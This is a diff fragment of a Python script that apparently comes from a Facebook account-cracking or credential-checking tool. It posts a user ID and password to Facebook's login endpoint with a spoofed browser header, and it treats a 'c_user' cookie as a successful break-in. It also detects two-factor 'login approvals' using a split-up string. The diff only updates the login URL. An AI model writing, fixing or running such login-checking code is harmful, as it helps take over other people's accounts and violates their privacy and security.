@@ -1384,7 +1384,7 @@ def p(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
             'viewport-width': '995',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"
+            url = "https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
